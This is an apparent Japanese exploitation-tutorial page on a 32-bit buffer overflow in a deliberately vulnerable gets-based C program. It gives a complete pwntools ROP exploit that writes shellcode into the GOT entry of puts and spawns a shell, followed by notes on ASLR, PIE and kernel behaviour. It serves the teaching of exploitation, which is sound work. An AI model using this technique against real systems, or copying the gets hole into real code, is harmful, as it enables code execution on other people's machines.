# ROP and Shellcode

## Source

{% file src="../../../.gitbook/assets/reliable\_shellcode-32.zip" caption="Reliable Shellcode - 32-bit" %}

```c
#include <stdio.h>

void vuln() {
    char buffer[20];

    puts("Give me the input");

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```

ごく標準的なバイナリです。

## Exploitation

まず、基本的な準備をすべて済ませます。

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()
```

ここで、おもしろいことをします。`gets` をもう一度呼ぶのです。最も重要な点は、`gets` に、受け取ったデータをバイナリのあるセクションに書き込むよう指示することです。読み取りも書き込みもできる場所が必要なので、GOT を選びます。`gets` に GOT のエントリを渡すと、こちらが送るシェルコードを受け取ったときに、**シェルコードを GOT に書き込みます**。これで、シェルコードが _どこにあるか正確に_ 分かります。仕上げに、`gets` 呼び出しの戻りアドレスを、シェルコードを書き込んだ場所に設定すれば、入力したばかりのものが完璧に実行されます。

```python
rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

## 64-bit

これで何ができるか、考えてみてください。

{% file src="../../../.gitbook/assets/reliable\_shellcode-64.zip" caption="Reliable Shellcode - 64-bit" %}

## ASLR

ASLR の心配は要りません。ROP を除けば、スタックも libc も使わないからです。

本当に問題になるのは PIE が有効な場合です。リークがなければ PLT の位置が分からないため `gets` を呼べず、GOT への書き込みも同じ問題を抱えるからです。

## Potential Problems

HackTheBox の Discord サーバーの [**clubby789** ](https://clubby789.me/)と [**Faith** ](https://faraz.faith/)のおかげで分かったことですが、GOT に _実行(Executable)_ 権限が付いていることはよくあります。NX がない場合、それがデフォルトの権限だからです。`5.9.0` など、より新しいカーネルでは、このデフォルトが変更されており、GOT には X 権限が付きません。

そのため、エクスプロイトが失敗する場合は、`uname -r` を実行してカーネルのバージョンを確認し、`5.9.0` かどうかを調べてください。そうであれば、シェルコードを置くための別の RWX 領域を探す必要があります(存在すればの話ですが)。
